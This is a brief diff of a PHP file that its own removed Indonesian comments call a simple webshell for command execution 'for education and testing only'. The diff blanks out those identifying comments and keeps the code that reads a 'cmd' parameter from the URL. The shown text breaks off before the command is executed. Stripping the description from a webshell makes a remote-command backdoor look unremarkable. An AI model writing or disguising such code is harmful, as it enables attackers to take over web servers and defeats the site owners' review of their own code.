@@ -1,8 +1,8 @@
 <?php
-// Simple webshell untuk eksekusi perintah
-// HANYA UNTUK TUJUAN EDUKASI DAN TESTING
+//
+// 
 
-// Cek apakah ada parameter 'cmd'
+//
 if (isset($_GET['cmd'])) {
     $cmd = $_GET['cmd'];
     
